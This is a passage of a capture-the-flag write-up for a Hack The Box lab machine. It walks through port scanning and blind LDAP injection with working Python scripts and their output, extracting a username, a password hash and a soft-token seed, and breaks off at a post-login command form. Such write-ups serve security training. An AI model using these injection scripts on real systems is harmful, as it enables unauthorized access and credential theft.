@@ -1,0 +1,763 @@
+I"O�<h1 id="htb-ctf-101010122-machine-write-up">HTB CTF (10.10.10.122) MACHINE WRITE-UP</h1>
+
+<h2 id="part-1--initial-recon">PART 1 : Initial Recon</h2>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nmap --min-rate 700 -p- -v 10.10.10.122
+</span></code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nmap -oN ctf.nmap -p22,80 -sC -sV -v 10.10.10.122
+</span></code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)
+|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)
+|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
+| http-methods: 
+|   Supported Methods: GET HEAD POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
+|_http-title: CTF
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="part-2--port-enumeration">PART 2 : Port Enumeration</h2>
+
+<ol>
+  <li>Visit http://10.10.10.122
+    <ul>
+      <li>
+        <p>Landing Page:</p>
+
+        <p><img src="./screenshots/26_ctf/80_index_php.png" alt="index.php" /></p>
+
+        <p><strong>NOTE(S)</strong>:</p>
+        <ul>
+          <li>The site is protected against bruteforcing</li>
+          <li>Automated tools are not an efficient option</li>
+        </ul>
+      </li>
+      <li>
+        <p><strong><em>/login.php</em></strong>:</p>
+
+        <p><img src="./screenshots/26_ctf/80_login_php.png" alt="login.php" /></p>
+
+        <ul>
+          <li>Page Source:
+            <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/login.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"inputUsername"</span> <span class="na">class=</span><span class="s">"col-sm-2 col-form-label"</span><span class="nt">&gt;</span>Username<span class="nt">&lt;/label&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"inputUsename"</span> <span class="na">name=</span><span class="s">"inputUsername"</span> <span class="na">placeholder=</span><span class="s">"Username"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"inputOTP"</span> <span class="na">class=</span><span class="s">"col-sm-2 col-form-label"</span><span class="nt">&gt;</span>OTP<span class="nt">&lt;/label&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"OTP"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"inputOTP"</span> <span class="na">name=</span><span class="s">"inputOTP"</span> <span class="na">placeholder=</span><span class="s">"One Time Password"</span><span class="nt">&gt;</span>
+      <span class="c">&lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&gt;</span>
+      <span class="c">&lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-primary  name="</span> <span class="na">submit</span><span class="err">"=""</span> <span class="na">value=</span><span class="s">"Login"</span><span class="nt">&gt;</span>Login<span class="nt">&lt;/button&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+...
+</code></pre></div>            </div>
+            <p><strong>NOTE(S)</strong>:</p>
+          </li>
+          <li>An error message pops up when guessing the <code class="highlighter-rouge">Username</code> input:
+            <ul>
+              <li>REQUEST: <code class="highlighter-rouge">inputUsername=test</code></li>
+              <li>RESPONSE: <code class="highlighter-rouge">&lt;div class="col-sm-10"&gt;User test not found&lt;/div&gt;</code></li>
+            </ul>
+          </li>
+          <li>Maybe <code class="highlighter-rouge">submit"="</code> is a clue for possible injection
+            <ul>
+              <li>REQUEST: <code class="highlighter-rouge">inputUsername=%3D</code></li>
+              <li>No error message popped up</li>
+            </ul>
+          </li>
+          <li><code class="highlighter-rouge">!</code>, <code class="highlighter-rouge">&amp;</code>, <code class="highlighter-rouge">*</code>, <code class="highlighter-rouge">(</code>, <code class="highlighter-rouge">)</code>, <code class="highlighter-rouge">\</code>, <code class="highlighter-rouge">|</code>, <code class="highlighter-rouge">&lt;</code>, and <code class="highlighter-rouge">&gt;</code> also doesn’t return an error message
+            <ul>
+              <li>These are special characters in LDAP</li>
+              <li>Maybe these characters are being filtered out by <strong>/login.php</strong></li>
+            </ul>
+          </li>
+          <li>A <strong>token string</strong> for the <code class="highlighter-rouge">OTP</code> is stored in a pre-existing attribute
+            <blockquote>
+
+            </blockquote>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>Attempt exploitation using <a href="https://www.owasp.org/index.php/LDAP_injection"><strong>LDAP Injection</strong></a>:
+    <ol>
+      <li>Try URL encoding the <strong><em>special characters</em></strong>:
+        <ul>
+          <li>REQUEST: <code class="highlighter-rouge">inputUsername=%2A</code></li>
+          <li>RESPONSE: <code class="highlighter-rouge">&lt;div class="col-sm-10"&gt;Cannot login&lt;/div&gt;</code></li>
+        </ul>
+
+        <p><strong>NOTE(S)</strong>:</p>
+        <ul>
+          <li><code class="highlighter-rouge">%2A</code> is a wildcard (<code class="highlighter-rouge">*</code>) operator in hex</li>
+          <li>The error message, <code class="highlighter-rouge">Cannot login</code>, could mean it’s a “valid” username</li>
+          <li>URL encoded <strong>special characters</strong> are not being filtered out
+            <blockquote>
+
+            </blockquote>
+          </li>
+        </ul>
+      </li>
+      <li>Extract an actual username:
+        <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span> <span class="k">as</span> <span class="n">u</span>
+
+<span class="n">username</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">char_list</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyz0123456789"</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">char_list</span><span class="p">)):</span>
+              
+        <span class="n">ldap_injection</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">s</span><span class="si">%</span><span class="s">c*"</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">char_list</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"inputUsername"</span><span class="p">:</span> <span class="n">u</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">ldap_injection</span><span class="p">)</span> <span class="p">}</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://10.10.10.122/login.php"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="s">"Cannot login"</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">username</span> <span class="o">=</span> <span class="n">username</span> <span class="o">+</span> <span class="n">char_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+            <span class="k">break</span>
+              
+    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">char_list</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span> <span class="p">:</span> <span class="k">break</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"[x] THE USERNAME IS "</span> <span class="o">+</span> <span class="n">username</span><span class="p">)</span>
+</code></pre></div>        </div>
+        <ul>
+          <li>Run using <code class="highlighter-rouge">python3</code>:
+            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l
+ld
+lda
+ldap
+ldapu
+ldapus
+ldapuse
+ldapuser
+[x] THE USERNAME IS ldapuser
+</code></pre></div>            </div>
+          </li>
+        </ul>
+
+        <p><strong>NOTE(S)</strong>:</p>
+        <ul>
+          <li><strong>Blind</strong> injection has yielded a result</li>
+          <li>An actual username has been extracted – <code class="highlighter-rouge">ldapuser</code>
+            <blockquote>
+
+            </blockquote>
+          </li>
+        </ul>
+      </li>
+      <li>Find available LDAP attributes:
+        <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span> <span class="k">as</span> <span class="n">u</span>
+
+<span class="n">attribute_list</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/usr/share/wordlists/ldap_attribute_names.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
+
+<span class="n">attributes</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">attribute_list</span><span class="p">:</span>
+              
+    <span class="n">ldap_injection</span> <span class="o">=</span> <span class="s">"ldapuser))(&amp;(</span><span class="si">%</span><span class="s">s=*"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+          
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"inputUsername"</span><span class="p">:</span> <span class="n">u</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">ldap_injection</span><span class="p">)</span> <span class="p">}</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://10.10.10.122/login.php"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="s">"Cannot login"</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">ldap_injection</span><span class="p">)</span>
+        <span class="n">attributes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+
+<span class="n">attribute_list</span><span class="o">.</span><span class="n">close</span><span class="p">()</span> 
+</code></pre></div>        </div>
+        <ul>
+          <li>Run using <code class="highlighter-rouge">python3</code>:
+            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapuser))(&amp;(cn=*
+ldapuser))(&amp;(commonName=*
+ldapuser))(&amp;(gidNumber=*
+ldapuser))(&amp;(homeDirectory=*
+ldapuser))(&amp;(loginShell=*
+ldapuser))(&amp;(mail=*
+ldapuser))(&amp;(name=*
+ldapuser))(&amp;(objectClass=*
+ldapuser))(&amp;(pager=*
+ldapuser))(&amp;(shadowLastChange=*
+ldapuser))(&amp;(shadowMax=*
+ldapuser))(&amp;(shadowMin=*
+ldapuser))(&amp;(shadowWarning=*
+ldapuser))(&amp;(sn=*
+ldapuser))(&amp;(surname=*
+ldapuser))(&amp;(uid=*
+ldapuser))(&amp;(uidNumber=*
+ldapuser))(&amp;(userPassword=*
+</code></pre></div>            </div>
+          </li>
+        </ul>
+
+        <p><strong>NOTE(S)</strong>:</p>
+        <ul>
+          <li><code class="highlighter-rouge">ldap_attribute_list.txt</code> was copied from <a href="https://github.com/droope/ldap-brute/blob/master/wordlists/attribute_names">ldap-brute from GitHub</a></li>
+          <li><code class="highlighter-rouge">userPassword</code>, <code class="highlighter-rouge">pager</code>, and <code class="highlighter-rouge">objectClass</code> might be of interest
+            <blockquote>
+
+            </blockquote>
+          </li>
+        </ul>
+      </li>
+      <li>Find the attribute with the <strong>token string</strong>:
+        <ul>
+          <li><code class="highlighter-rouge">userPassword</code>:
+            <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span> <span class="k">as</span> <span class="n">u</span>
+
+<span class="n">token</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">:</span>
+      <span class="n">attribute_value</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">token</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+      <span class="k">print</span><span class="p">(</span><span class="n">attribute_value</span><span class="p">)</span>
+      <span class="n">token</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span>
+              
+      <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">attribute_value</span><span class="p">[</span><span class="mi">19</span><span class="p">:])</span><span class="o">==</span><span class="mi">86</span><span class="p">:</span> <span class="k">break</span>
+        
+  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+
+      <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">attribute_value</span><span class="p">[</span><span class="mi">19</span><span class="p">:])</span><span class="o">==</span><span class="mi">85</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">:</span>
+          <span class="k">if</span> <span class="n">x</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span> <span class="n">token</span> <span class="o">=</span> <span class="n">token</span> <span class="o">+</span> <span class="s">"0"</span>
+
+      <span class="n">payload</span> <span class="o">=</span> <span class="s">"ldapuser))(&amp;(uid=ldapuser)(userPassword:2.5.13.18:="</span>
+      <span class="n">ldap_injection</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">"</span><span class="si">%</span><span class="s">s</span><span class="si">%</span><span class="s">cf"</span> <span class="o">%</span> <span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+
+      <span class="k">if</span> <span class="n">ldap_injection</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:]</span> <span class="o">==</span> <span class="s">"0ff"</span><span class="p">:</span>
+          <span class="n">hex_val</span> <span class="o">=</span> <span class="s">"0x"</span> <span class="o">+</span> <span class="n">ldap_injection</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+          <span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="p">[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">hex_val</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span>
+          <span class="n">ldap_injection</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">"</span><span class="si">%</span><span class="s">s</span><span class="si">%</span><span class="s">cf"</span> <span class="o">%</span> <span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+          
+      <span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"inputUsername"</span><span class="p">:</span> <span class="n">u</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">ldap_injection</span><span class="p">)</span> <span class="p">}</span>
+      <span class="n">req</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://10.10.10.122/login.php"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+      <span class="k">if</span> <span class="n">x</span><span class="o">==</span><span class="mi">0</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">:</span> <span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">token</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="s">"0"</span>
+      <span class="k">elif</span> <span class="s">"Cannot login"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+          <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">:</span> <span class="n">token</span> <span class="o">=</span> <span class="n">token</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+          <span class="k">else</span><span class="p">:</span> <span class="n">token</span> <span class="o">=</span> <span class="n">token</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="o">+</span><span class="mi">1</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+          <span class="k">break</span>
+</code></pre></div>            </div>
+            <ul>
+              <li>Run using <code class="highlighter-rouge">python3</code>:
+                <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+{c
+{cr
+{cry
+{cryp
+{crypt
+{crypt|
+{crypt}#
+{crypt}$5
+...
+{crypt}$6$bkSTg.p5$vJhB6dZrrPY4KyxGY/dubPZ9tnxTkXwI7ENFAZGsItSi5ia4WH3G-
+{crypt}$6$bkSTg.p5$vJhB6dZrrPY4KyxGY/dubPZ9tnxTkXwI7ENFAZGsItSi5ia4WH3G.
+...
+{crypt}$6$bkSTg.p5$vJhB6dZrrPY4KyxGY/dubPZ9tnxTkXwI7ENFAZGsItSi5ia4WH3G.0T9XicaZGNOqp9FfdbS5N2hT0exXi23
+{crypt}$6$bkSTg.p5$vJhB6dZrrPY4KyxGY/dubPZ9tnxTkXwI7ENFAZGsItSi5ia4WH3G.0T9XicaZGNOqp9FfdbS5N2hT0exXi245
+{crypt}$6$bkSTg.p5$vJhB6dZrrPY4KyxGY/dubPZ9tnxTkXwI7ENFAZGsItSi5ia4WH3G.0T9XicaZGNOqp9FfdbS5N2hT0exXi246
+{crypt}$6$bkSTg.p5$vJhB6dZrrPY4KyxGY/dubPZ9tnxTkXwI7ENFAZGsItSi5ia4WH3G.0T9XicaZGNOqp9FfdbS5N2hT0exXi2460
+</code></pre></div>                </div>
+              </li>
+            </ul>
+
+            <p><strong>NOTE(S)</strong>:</p>
+            <ul>
+              <li>The <code class="highlighter-rouge">userPassword</code> attribute is a bit special:
+                <ul>
+                  <li>According to Microsoft, <code class="highlighter-rouge">userPassword</code> has an <a href="https://docs.microsoft.com/en-us/windows/desktop/adschema/a-unixuserpassword">Object(Replica-Link) syntax</a></li>
+                  <li><a href="https://ldapwiki.com/wiki/Replica%20Link">Object(Replica-Link)</a> has an OID 2.5.5.10 which is an <strong>Octet String</strong></li>
+                  <li><strong>Octet Strings</strong> has a different set of <a href="https://ldap.com/matching-rules/">operations</a>:
+                    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Octet string matching rules are very simple rules that perform byte-by-byte comparisons of octet string 
+values. All capitalization and spacing is considered significant. 
+</code></pre></div>                    </div>
+                  </li>
+                  <li><code class="highlighter-rouge">ldapuser))(&amp;(uid=ldapuser)(userPassword:2.5.13.18:=</code>
+                    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>octetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule that will perform a bit-by-bit 
+comparison (in big endian ordering) of two octet string values until a difference is found. The first 
+case in which a zero bit is found in one value but a one bit is found in another will cause the value 
+with the zero bit to be considered less than the value with the one bit. 
+</code></pre></div>                    </div>
+                  </li>
+                  <li>This means that a simple wildcard (<code class="highlighter-rouge">*</code>) comparison won’t do</li>
+                </ul>
+              </li>
+              <li>A <strong>sha512crypt</strong> hash was extracted – <code class="highlighter-rouge">{crypt}$6$bkSTg.p5$vJhB6dZrrPY4KyxGY/dubPZ9tnxTkXwI7ENFAZGsItSi5ia4WH3G.0T9XicaZGNOqp9FfdbS5N2hT0exXi2460</code></li>
+              <li>This seems to be a <strong>RABBIT HOLE</strong></li>
+            </ul>
+          </li>
+          <li><code class="highlighter-rouge">pager</code>
+            <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span> <span class="k">as</span> <span class="n">u</span>
+
+<span class="n">token</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">while</span><span class="p">(</span> <span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)</span><span class="o">!=</span><span class="mi">81</span> <span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
+
+        <span class="n">ldap_injection</span> <span class="o">=</span> <span class="s">"ldapuser))(&amp;(pager=</span><span class="si">%</span><span class="s">s</span><span class="si">%</span><span class="s">d*"</span> <span class="o">%</span> <span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"inputUsername"</span><span class="p">:</span> <span class="n">u</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">ldap_injection</span><span class="p">)</span> <span class="p">}</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://10.10.10.122/login.php"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="s">"Cannot login"</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">token</span> <span class="o">=</span> <span class="n">token</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+            <span class="k">break</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"[x] THE TOKEN IS "</span> <span class="o">+</span> <span class="n">token</span><span class="p">)</span>
+</code></pre></div>            </div>
+            <ul>
+              <li>Run using <code class="highlighter-rouge">python3</code>:
+                <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2
+28
+285
+2854
+28544
+285449
+2854494
+28544949
+285449490
+2854494900
+...
+28544949001135715653165154565233557071316741144572714
+285449490011357156531651545652335570713167411445727140
+2854494900113571565316515456523355707131674114457271406
+28544949001135715653165154565233557071316741144572714060
+285449490011357156531651545652335570713167411445727140604
+2854494900113571565316515456523355707131674114457271406041
+...
+28544949001135715653165154565233557071316741144572714060417214145671110271671700
+285449490011357156531651545652335570713167411445727140604172141456711102716717000
+[x] THE TOKEN IS 285449490011357156531651545652335570713167411445727140604172141456711102716717000
+</code></pre></div>                </div>
+                <p><strong>NOTE(S)</strong>:</p>
+              </li>
+              <li>The <code class="highlighter-rouge">pager</code> attribute seems to contain the <strong>token string</strong></li>
+              <li>The token string is <code class="highlighter-rouge">285449490011357156531651545652335570713167411445727140604172141456711102716717000</code></li>
+              <li>This token is called a <strong><em>Pure Numeric CTF (Compressed Token Format) string</em></strong></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ol>
+  </li>
+  <li>Login using the information found:
+    <ol>
+      <li>Generate an OTP using the token string:
+        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stoken import <span class="nt">--token</span><span class="o">=</span>285449490011357156531651545652335570713167411445727140604172141456711102716717000
+<span class="c"># Enter new password: </span>
+<span class="c"># Confirm new password: </span>
+
+stoken tokencode
+<span class="c"># Enter PIN:</span>
+<span class="c"># PIN must be 4-8 digits.  Use '0000' for no PIN.</span>
+<span class="c"># Enter PIN: 0000</span>
+<span class="c"># 83502926</span>
+</code></pre></div>        </div>
+        <p><strong>NOTE(S)</strong>:</p>
+        <ul>
+          <li><code class="highlighter-rouge">stoken</code> can be used to generate OTPs based on a token string</li>
+          <li>OTPs expire over a brief period of time</li>
+          <li><a href="https://manpages.debian.org/testing/stoken/stoken.1.en.html">Click here to view the manual for the <code class="highlighter-rouge">stoken</code> command</a></li>
+        </ul>
+      </li>
+      <li>
+        <p>Login using the credentials found/generated (<strong>ldapuser</strong>:<strong>83502926</strong>)</p>
+
+        <ul>
+          <li>
+            <p>Landing Page: <strong><em>/page.php</em></strong></p>
+
+            <p><img src="./screenshots/26_ctf/80_page_php.png" alt="page.php" /></p>
+
+            <ul>
+              <li>Page Source:
+                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/page.php"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="nt">&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-12"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"inputCmd"</span> <span class="na">class=</span><span class="s">"col-sm-2 col-form-label"</span><span class="nt">&gt;</span>Cmd<span class="nt">&lt;/label&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"inputCmd"</span> <span class="na">name=</span><span class="s">"inputCmd"</span> <span class="na">placeholder=</span><span class="s">"Command to issue"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/div&gt;</span>
